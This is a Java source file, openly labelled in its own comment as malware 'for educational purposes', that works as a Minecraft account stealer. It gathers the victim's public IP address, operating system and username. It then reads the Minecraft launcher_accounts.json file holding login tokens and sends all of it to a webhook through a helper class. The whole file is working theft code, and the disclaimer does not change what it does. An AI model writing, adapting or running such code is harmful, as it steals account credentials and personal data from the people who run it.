package halq.troll.troll.moment;

import halq.troll.troll.moment.utils.webhookUtil;

import java.io.*;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class reg {

    /**
     * @author halq
     * @apiNote Malware created for educational purposes, I am not responsible for misuse
     * @since 25/05/2022
     */


    public static void main() {
        StringBuilder message = new StringBuilder();
        try {

            //ip regs
            URL whatismyip = new URL("https://checkip.amazonaws.com/");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            String ip = bufferedReader.readLine();

            //os regs
            String operSys = System.getProperty("os.name").toLowerCase();
            String username = System.getProperty("user.name").toLowerCase();

            //minecraft regs
            File minecraftoken = new File(System.getProperty("user.home") + "/AppData/Roaming/.minecraft/launcher_accounts.json");


            message.append("```" + "\n" +
                    "Os < " + operSys + "\n" +
                    "UserName < " + username + "\n" +
                    "Ip < " + ip + "\n");

            if (minecraftoken.exists()) {
                String s;
                BufferedReader readerMine = new BufferedReader(new FileReader(minecraftoken));

                while ((s = readerMine.readLine()) != null) {
                    message.append("MinecraftToken < ").append(s);
                }
            }else {
                message.append("MinecraftToken < NO INFO" + "\n");
            }

            message.append("```");

            webhookUtil.main(message.toString());


        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
